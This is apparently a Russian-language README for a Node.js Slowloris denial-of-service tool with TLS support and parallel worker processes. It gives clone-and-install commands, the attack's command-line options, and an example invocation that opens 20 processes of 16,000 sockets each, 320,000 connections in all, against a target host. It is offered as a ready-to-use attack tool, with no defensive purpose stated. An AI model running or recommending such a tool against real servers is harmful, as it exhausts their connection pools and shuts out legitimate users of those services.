![slow loris picture](https://upload.wikimedia.org/wikipedia/commons/b/b8/Slowloris_DDOS.png)

## Slowloris

Node.js реализация slowloris-атаки с поддержкой TLS и параллельных OS-процессов.

## Что такое Slowloris?

> Slowloris открывает множество соединений к веб-серверу и удерживает их как можно дольше, непрерывно отправляя незавершённые HTTP-запросы. В итоге пул соединений сервера переполняется, и новые легитимные запросы отклоняются.
> [источник](https://www.imperva.com/learn/application-security/slowloris/)

## Установка

```bash
git clone https://github.com/AndriiMSN/slowattack_bash.git
npm install --prefix slowattack_bash/vendor-slowloris
```

## Использование

```
node vendor-slowloris/bin/global.js [options] <url>

Options:
  -V, --version        output the version number
  -p, --port <n>       The port of the webserver (default: 80)
  -s, --sockets <n>    Number of sockets per worker process (default: 200)
  -i, --instances <n>  Number of parallel OS worker processes (default: 20)
  -t, --time <n>       Duration of the attack in milliseconds
  -h, --help           output usage information
```

## Архитектура

`-i` запускает N независимых дочерних OS-процессов через `child_process.fork()`. Каждый процесс имеет собственную таблицу файловых дескрипторов и свой `ulimit -n` — что эквивалентно запуску скрипта из N отдельных терминалов одновременно. Прогресс агрегируется в родительском процессе и отображается единым прогресс-баром, который циклически повторяется вместо перехода к статусу «Attacking».

## Пример

```bash
# 20 процессов × 16 000 сокетов = 320 000 соединений
node vendor-slowloris/bin/global.js -p 80 -s 16000 -i 20 http://target.sslip.io
```

## Лицензия

[MIT License](https://opensource.org/licenses/MIT)
